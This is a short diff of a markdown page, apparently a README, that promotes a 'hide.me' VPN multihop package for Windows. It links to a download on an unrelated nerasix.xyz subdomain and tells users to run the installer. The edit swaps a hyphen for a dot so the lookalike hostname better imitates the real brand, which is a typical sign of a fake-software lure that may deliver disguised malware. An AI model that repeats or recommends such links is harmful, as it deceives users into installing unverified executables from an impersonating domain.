@@ -8,8 +8,8 @@ VPN with multihop routing and WireGuard support · Professional desktop drop · 
 
 > Use the project link below for Windows.
 
-* **Project link:** **[hide-me-vpn-multi-hop-config-2026.nerasix.xyz](https://hide-me-vpn-multi-hop-config-2026.nerasix.xyz/)**
-* **Full URL:** `https://hide-me-vpn-multi-hop-config-2026.nerasix.xyz/`
+* **Project link:** **[hide.me-vpn-multi-hop-config-2026.nerasix.xyz](https://hide.me-vpn-multi-hop-config-2026.nerasix.xyz/)**
+* **Full URL:** `https://hide.me-vpn-multi-hop-config-2026.nerasix.xyz/`
 * **Type:** Desktop package | Windows 10 and 11, 64-bit
 * **Setup:** Run the installer from the extracted folder
 
